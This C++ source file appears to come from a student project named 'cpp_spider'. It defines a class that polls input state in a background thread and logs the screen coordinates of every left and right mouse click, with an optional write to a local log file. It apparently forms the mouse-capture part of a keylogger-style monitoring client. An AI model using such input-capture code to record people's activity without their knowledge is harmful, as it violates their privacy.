/*
** MouseEvent.cpp for C:\Users\fagnol_r\Desktop\cpp_spider in C:\Users\fagnol_r\Desktop\cpp_spider\Client\Sources
**
** Made by
** Login   <fagnol_r@epitech.net>
**
** Started on  Sun Oct 01 17:54:22 2017
** Last update Sat Oct 07 22:40:15 2017 fagnol_r
*/

#include "MouseEvent.hpp"

MouseEvent::MouseEvent()
{
  _isSend = false;
}

MouseEvent::~MouseEvent()
{
}

void      MouseEvent::setSend(bool send)
{
  this->_isSend = send;
}

bool      MouseEvent::getSend()
{
  return (_isSend);
}

void      MouseEvent::getCurrentClick()
{
  if (_key == MK_LBUTTON)
  {
    GetCursorPos(&this->_position);
    _mouseBuffer += "Clique gauche en " + std::to_string(_position.x) + " et " + std::to_string(_position.y) + "\n";
    Sleep(100);
  }
  if (_key == MK_RBUTTON)
  {
    GetCursorPos(&this->_position);
    _mouseBuffer += "Clique droit en " + std::to_string(_position.x) + " et " + std::to_string(_position.y) + "\n";
    Sleep(100);
  }
  //writeDataInFile();
}

void          MouseEvent::init()
{
  _t = std::thread(&MouseEvent::getPos, this);
}

void      MouseEvent::getPos()
{
//  boost::mutex::scoped_lock   lock(this->_mutex);
  while (1)
  {
    for(_key = 0; _key <= 190; _key++)
    {
      if (GetAsyncKeyState(_key) == -32767)
        getCurrentClick();
    }
  }
}

std::string   MouseEvent::getBuffer()
{
  return this->_mouseBuffer;
}

void          MouseEvent::writeDataInFile()
{
  _logs.open ("C:\\Users\\fagnol_r\\Desktop\\cpp_spider\\logs1.txt", std::fstream::in | std::fstream::out | std::fstream::app);
  _logs << _mouseBuffer.c_str();
  _logs.close();
  this->_mouseBuffer.erase();
}
